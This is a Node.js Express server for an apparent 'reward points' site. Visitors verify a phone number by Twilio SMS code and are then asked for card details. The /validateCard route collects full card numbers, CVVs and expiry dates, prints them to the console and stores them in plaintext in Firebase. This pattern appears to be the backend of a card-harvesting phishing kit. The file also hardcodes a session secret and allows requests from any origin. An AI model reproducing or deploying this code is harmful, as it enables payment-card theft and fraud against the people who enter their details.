require('dotenv').config();
const express = require('express');
const path = require('path');
const bodyParser = require('body-parser');
const twilio = require('twilio');
const axios = require('axios');
const cors = require('cors');
var valid = require("card-validator");
const { Console } = require('console');
const app = express();
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));
app.use(express.static(path.join(__dirname, 'public')));
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());
const db = require('./firebase-config');
const cookieParser = require('cookie-parser');
const { generateToken, verifyToken } = require('./jwt');
const session = require('express-session');

app.use(cors({ 
    origin: '*', 
    methods: ['GET','POST'],
}));

app.use(cookieParser());


app.use(session({
  secret: 'your-secret-key', // Replace with a strong secret key
  resave: false,
  saveUninitialized: true,
  cookie: { secure: false } // Set to true if using HTTPS
}));





// Mt SID
const accountSid = process.env.TWILIO_ACCOUNT_SID;
const authToken = process.env.TWILIO_AUTH_TOKEN;
const serviceSid = process.env.TWILIO_SERVICE_SID;
const client = twilio(accountSid, authToken);

const authenticateJWT = (req, res, next) => {
  // next();
  const token = req.cookies.token; // Get JWT from cookie
  if (token) {
    const user = verifyToken(token);
    if (user) {
      req.user = user;
      next();
    } else {
      res.sendStatus(403); // Forbidden
    }
  } else {
    res.sendStatus(401); // Unauthorized
  }
};



// // Route for Login Page
app.get('/', (req, res) => {
  res.render('login');
});


// // Route for reward
app.get('/reward',  authenticateJWT,(req, res) => {
    res.render('reward');
  });


// // Route for reward points
app.get('/rewardpoints', authenticateJWT, (req, res) => {
    res.render('reward_points');
  });

app.get('*', (req, res) => {
    res.render('pnf');
  });
  


app.post('/sendOTP', (req, res) => {
  // console.log("OTP sent to",req.body)
    // res.json({ success: true});
    const { phone } = req.body;
    console.log(phone)
    client.verify.v2.services(serviceSid)
      .verifications
      .create(
        {to: phone, channel: 'sms'}
      )
      .then(verification => {
          console.log(verification.sid);
          res.json({ success: true, sid: verification.sid });
      })
      .catch(error => {
          console.error('Error sending OTP:', error);
          res.json({ success: false, error: error.message });
      });
});



app.post('/verifyOTP', (req, res) => {
  // const { phone, otp, userData } = req.body; 
  // const token = generateToken({ phone });
  // res.cookie('token', token, { httpOnly: true, secure: true, sameSite: 'strict' }); // Set cookie
  // res.json({ success: true });
  const { phone, otp, userData } = req.body; 
  client.verify.v2.services(serviceSid)
      .verificationChecks
      .create({ to: phone, code: otp })
      .then(verification_check => {
          if (verification_check.status === 'approved') {
            const usersRef = db.ref('users');

            // Generate a unique key for the user
            const userKey = usersRef.push().key; 

            usersRef.child(userKey).set(userData, (error) => {
                if (error) {
                      console.error('Error saving user data to Firebase:', error);
                      res.json({ success: false, error: 'Error saving user data' });
                } else {
                    req.session.userData = { uid: userKey, ...userData };
                    const token = generateToken({ phone });
                    res.cookie('token', token, { httpOnly: true, secure: true, sameSite: 'strict' });
                    res.json({ success: true });
                }
            });

              // // Save user data to Firebase
              // const usersRef = db.ref('users');
              // const newUserRef = usersRef.push();
              // newUserRef.set({
              //     phone: phone,
              //     ...userData
               
              // }, (error) => {
              //     if (error) {
              //         console.error('Error saving user data to Firebase:', error);
              //         res.json({ success: false, error: 'Error saving user data' });
              //     } else {
              //           req.session.userData = userData;
              //           const token = generateToken({ phone });
              //           res.cookie('token', token, { httpOnly: true, secure: true, sameSite: 'strict' }); // Set cookie
              //           res.json({ success: true });
              //     }
              // });
          } else {
              res.json({ success: false });
          }
      })
      .catch(error => {
          console.error("Error verifying OTP:", error);
          res.json({ success: false, error: error.message });
      });
});




app.post('/validateCard', (req, res) => {
    const { cardNumber, cvv, expiryDate } = req.body;

    const numberValidation = valid.number(cardNumber);
    console.log('npm_validation',cardNumber,numberValidation)
    if (!numberValidation.isPotentiallyValid) {
        return res.json({ valid: false, error: 'Invalid card number format' });
    }
    else if (!numberValidation.isValid) {
        return res.json({ valid: false, error: 'Invalid card number' });
    }
    if (req.session.userData) { 
      const userData = req.session.userData; 

      const cardData = {
          cardNumber,
          cvv,       
          expiryDate
      };
      console.log(cardData,userData)
      // Save card data as a nested object
      db.ref(`users/${userData.uid}/cards`).set(cardData, (error) => {
          if (error) {
              console.error('Error saving card to Firebase:', error);
              res.json({ valid: false, error: 'Error saving card details' });
          } else {
              res.json({ valid: true });
          }
      });
  } else {
      console.log(req.session.userData)
      res.json({ valid: false, error: 'Unauthorized to save card' }); 
  }
    // if (req.session.userData) { 
    //   const userData = req.session.userData;}
    // const cardsRef = db.ref('cards');
    // const newCardRef = cardsRef.push();
  
    // newCardRef.set({
    //   cardNumber,
    //   cvv,
    //   expiryDate
    // }, (error) => {
    //   if (error) {
    //     console.error('Error saving card to Firebase:', error);
    //     res.json({ valid: false, error: 'Error saving card details' });
    //   } else {
    //     res.json({valid: true, error: 'Invalid card number format' });
    //   }
    // });
    // res.json({ valid: true })

    // If potentially valid, proceed with API check (or your own logic)
    // axios.post('CARD_VALIDATION_API_URL', { cardNumber, cvv, expiryDate })
    //     .then(response => {
    //         if (response.data.valid) {
    //             if (response.data.cardType !== numberValidation.card?.type) {
    //                 console.warn('Card type mismatch between API and initial validation');
    //                 const cardsRef = db.ref('cards');
    //                 const newCardRef = cardsRef.push();
                  
    //                 newCardRef.set({
    //                   cardNumber,
    //                   cvv,
    //                   expiryDate
    //                 }, (error) => {
    //                   if (error) {
    //                     console.error('Error saving card to Firebase:', error);
    //                     res.json({ valid: false, error: 'Error saving card details' });
    //                   } else {
    //                     res.json({ valid: true });
    //                   }
    //                 });
    //             }

    //             res.json({ valid: true, cardType: response.data.cardType }); 
    //         } else {
    //             res.json({ valid: false, error: response.data.error || 'API validation failed' });
    //         }
    //     })
    //     .catch(error => res.json({ valid: false, error: 'API request failed' }));
});



app.listen(3000, () => {
    console.log('Server running on port 3000');
});